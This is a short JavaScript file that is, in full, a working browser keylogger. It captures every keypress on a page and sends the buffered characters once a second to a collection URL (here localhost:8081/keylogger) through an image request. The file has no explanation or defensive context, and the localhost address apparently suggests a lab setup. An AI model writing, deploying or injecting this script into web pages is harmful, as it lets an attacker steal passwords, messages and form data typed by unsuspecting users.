var keys='';
var url = 'http://localhost:8081/keylogger?k=';
let key="";
document.onkeypress = function(e) {
	get = window.event?event:e;
	key= get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
        // console.log(keys)
		keys = '';
	}
}, 1000);